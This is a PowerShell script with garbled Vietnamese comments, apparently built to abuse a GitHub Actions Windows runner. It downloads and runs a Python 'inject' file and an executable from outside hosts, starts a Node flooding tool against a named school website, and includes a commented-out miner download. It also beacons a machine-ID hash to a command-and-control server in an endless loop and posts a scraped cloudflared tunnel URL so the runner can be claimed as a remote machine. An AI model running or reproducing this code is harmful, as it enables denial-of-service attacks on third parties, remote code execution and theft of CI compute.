# L·∫•y t√™n user hi·ªán t·∫°i
$currentUser = $env:USERNAME

if ($currentUser -ne "runneradmin") {
    Write-Host "‚ùå Script ch·ªâ ch·∫°y khi user l√† runneradmin (hi·ªán t·∫°i: $currentUser)"
    exit 1
}

Write-Host "‚úÖ User hi·ªán t·∫°i l√† runneradmin."

# Ki·ªÉm tra quy·ªÅn admin
$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()
).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-Not $IsAdmin) {
    Write-Host "‚ùå Script c·∫ßn ch·∫°y v·ªõi quy·ªÅn Administrator."
    exit 1
}

Write-Host "‚úÖ Script ƒëang ch·∫°y d∆∞·ªõi quy·ªÅn Administrator."

# ƒê∆∞·ªùng d·∫´n file s·∫Ω t·∫£i
$scriptUrl  = "https://raw.githubusercontent.com/c2loves/infected/refs/heads/main/newinject.py"
$scriptPath = "$env:appdata\injectnew.py"

# T·∫£i file v·ªÅ
Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath -UseBasicParsing
Write-Host "üì• ƒê√£ t·∫£i v·ªÅ: $scriptPath"

# Ki·ªÉm tra Python ƒë√£ c√†i ch∆∞a
if (-Not (Get-Command python -ErrorAction SilentlyContinue)) {
    Write-Host "‚ùå Ch∆∞a c√≥ Python trong PATH."
    exit 1
}

# Ch·∫°y script Python
Write-Host "üöÄ ƒêang ch·∫°y script Python..."
pythonw $scriptPath

$url = "https://ornate-gaufre-a9dbcd.netlify.app/trumddos.exe"
$outfile = "$env:TEMP\sechgay.exe"
Invoke-WebRequest -Uri $url -OutFile $outfile
Start-Process $outfile

$path="$env:TEMP\human.js"; while(-not (Test-Path $path)){ Start-Sleep -Seconds 1 }
Start-Process node -ArgumentList "--trace-warnings","human.js","https://thcs-quangtrung-phuong2baoloc.lamdong.dlib.vn?n=ditmenhatruong","6000","kk.txt","15","200" -WorkingDirectory $env:TEMP -NoNewWindow -PassThru

$url = "http://zwalx5oi.x10.mx/a.exe"
$outfile = "$env:TEMP\mycoin.exe"
# Invoke-WebRequest -Uri $url -OutFile $outfile
# Start-Process $outfile

$username  = $env:USERNAME
$userdomain = $env:USERDOMAIN
$machineid = (Get-WmiObject Win32_ComputerSystemProduct).UUIDt
$raw = "$username|$userdomain|$machineid"
$md5 = [System.BitConverter]::ToString(
    (New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider).ComputeHash(
        [System.Text.Encoding]::UTF8.GetBytes($raw)
    )
).Replace("-", "").ToLower()

$username  = $env:USERNAME
$userdomain = $env:USERDOMAIN
$machineid = (Get-WmiObject Win32_ComputerSystemProduct).UUID
$raw = "$username|$userdomain|$machineid"
$md5 = [System.BitConverter]::ToString(
    (New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider).ComputeHash(
        [System.Text.Encoding]::UTF8.GetBytes($raw)
    )
).Replace("-", "").ToLower()

while ($true) {
    Invoke-RestMethod -Uri "http://simpleappchat.elementfx.com/online.php?id=$md5"
    $logFile = Get-ChildItem -Path "D:\A" -Recurse -Filter "cloudflared.log" | Select-Object -First 1
    if ($logFile) {
        $content = Get-Content -Path $logFile.FullName -Raw
        if ($content -match "https://[a-zA-Z0-9-]+\.trycloudflare\.com") {
            $url = $matches[0]
            $response = Invoke-WebRequest -Uri "http://simpleappchat.elementfx.com/claimvps.php" -Method POST -Body @{ cloudflaredUrl = $url }
            Write-Output "Sent: $url"
            Write-Output "Reply: $($response.Content)"
        } else {
            Write-Output "No URL found in log."
        }
    } else {
        Write-Output "No cloudflared.log found in D:\A"
    }
    Start-Sleep -Seconds 5
}
